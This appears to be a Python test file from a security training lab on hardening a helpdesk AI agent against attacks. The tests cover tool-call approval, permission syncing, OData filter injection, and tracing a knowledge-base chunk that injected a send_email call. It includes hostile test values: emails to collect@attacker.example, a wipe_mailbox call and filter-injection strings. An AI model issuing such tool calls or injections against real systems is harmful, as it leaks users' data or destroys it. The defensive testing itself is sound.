"""test_challenge.py: YOUR TURN. These 5 tests fail until you close the gaps the hardened build still leaves.

  Challenge 1  sync_check.py: stale_documents() so permission changes reach the index (A6)
  Challenge 2  review_policy.py: approve() checks arguments, not just tool names (A7)
  Challenge 3  safe_filter.py: build_filter() that can't be widened by its inputs
  Challenge 4  hunt.py: reconstruct() finds the chunk that put the arguments into a write call
"""

import json
import unittest

import attack
import hunt
import review_policy
import safe_filter
import sync_check
import twin


def req(name, **args):
    return {"type": "mcp_approval_request", "id": "mcpr_t", "server_label": "helpdesk-actions", "name": name,
            "arguments": json.dumps(args)}


class Challenge(unittest.TestCase):
    longMessage = False

    def test_c1_resync(self):
        """C1 stale_documents() lists HR-7002 after the 08:00 sync, nothing after a 10:00 sync; A6 blocked"""
        got = sorted(sync_check.stale_documents(twin.SOURCE["docs"], "2026-10-19T08:00:00Z"))
        self.assertTrue(got == ["HR-7002"], f"stale_documents() returned {got}, expected ['HR-7002']")
        self.assertEqual(list(sync_check.stale_documents(twin.SOURCE["docs"], "2026-10-19T10:00:00Z")), [])
        a6 = next(r for r in attack.run("fixes", quiet=True)["results"] if r["id"] == "A6")
        self.assertFalse(a6["worked"])

    def test_c2_review(self):
        """C2 approve() refuses outside recipients and unknown tools, allows Bob's own email and ticket; A7 blocked"""
        self.assertFalse(review_policy.approve(req("send_email", to="collect@attacker.example", subject="kb", body="x"), "bob"),
                         "approved send_email to collect@attacker.example")
        self.assertFalse(review_policy.approve(req("send_email", to="bob@contoso.com.attacker.example", subject="s", body="x"), "bob"))
        self.assertFalse(review_policy.approve(req("wipe_mailbox", user="bob"), "bob"))
        self.assertTrue(review_policy.approve(req("send_email", to="bob@contoso.com", subject="VPN", body="steps"), "bob"))
        self.assertTrue(review_policy.approve(req("create_ticket", summary="dock"), "bob"))
        r = {x["id"]: x for x in attack.run("fixes", quiet=True)["results"]}
        self.assertFalse(r["A7"]["worked"])
        self.assertFalse(r["L4"]["failed"] or r["L5"]["failed"])

    def test_c3_safe_filter(self):
        """C3 build_filter(): unknown or delimiter-bearing groups raise; quotes in department stay inside the string"""
        for bad in (["hr hr"], ["helpdesk-staff,hr"], ["finance"], ["helpdesk-staff')) or true or (('"]):
            with self.assertRaises(ValueError, msg=f"accepted {bad}"):
                safe_filter.build_filter(bad, None)
        flt = safe_filter.build_filter(["helpdesk-staff"], "x' or true or title eq 'y")
        rows = twin.build_rows(twin.setup("fixes"))
        self.assertFalse(any(twin.odata_match(flt, r) for r in rows), f"filter widened: {flt}")
        ok = safe_filter.build_filter(["helpdesk-staff"], None)
        self.assertTrue(any(twin.odata_match(ok, r) and r["parent_id"] == "KB-2040" for r in rows))

    def test_c4_reconstruct(self):
        """C4 reconstruct() ties turn-0044's send_email to chunk KB-1001b#1 and nothing else"""
        got = hunt.reconstruct(hunt.load_events())
        self.assertTrue(got == [("turn-0044", "send_email", "KB-1001b#1")], f"reconstruct() returned {got}")

    def test_c5_overall(self):
        """C5 overall: the hardened build stops 9 of 9 attacks and still answers 5 of 5 legitimate requests"""
        s = attack.run("fixes", quiet=True)["summary"]
        self.assertTrue((s["worked"], s["failed"]) == (0, 0),
                        f"{s['worked']} of 9 attacks still work, {s['failed']} of 5 legitimate requests fail")


if __name__ == "__main__":
    unittest.main()
